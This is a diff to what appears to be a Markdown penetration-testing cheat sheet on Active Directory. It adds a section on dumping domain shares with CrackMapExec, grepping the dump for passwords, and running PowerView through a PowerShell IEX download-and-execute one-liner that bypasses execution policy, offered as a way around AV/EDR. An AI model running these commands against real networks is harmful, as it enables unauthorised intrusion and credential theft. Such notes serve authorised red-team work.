@@ -57,12 +57,38 @@ To get all the important information from the Active Directory :
 {: .nolineno }
 
 ---
-### Ordered list
+## Shares
+ump all shares via CrackMapExec. This can be used on native Kali distribution :
 
-1. Firstly
-2. Secondly
-3. Thirdly
+```bash
+crackmapexec smb IP_ADDRESS/MASK -u 'XXX' -p 'XXX' -M spider_plus -o READ_ONLY=false
+```
+{: .nolineno }
 
+This command create a directory cme_spider_plus in /tmp (for Linux). To retrive passwords, simply use grep, by using keywords like 'password', 'pass', 'username', 'ldap://', etc.
+
+```bash
+grep -rnw ./ -e 'password'
+```
+{: .nolineno }
+
+If detected by AV/EDR, try PowerShell one-liner PowerView :
+
+```powershell
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"
+```
+{: .nolineno }
+
+Then, a lot of functionalities can be used. To find all domain shares :
+
+```powershell
+Find-DomainShare -CheckShareAccess
+```
+{: .nolineno }
+
+All the functionalities here : <https://powersploit.readthedocs.io/en/latest/Recon/>
+
+---
 ### Unordered list
 
 - Chapter
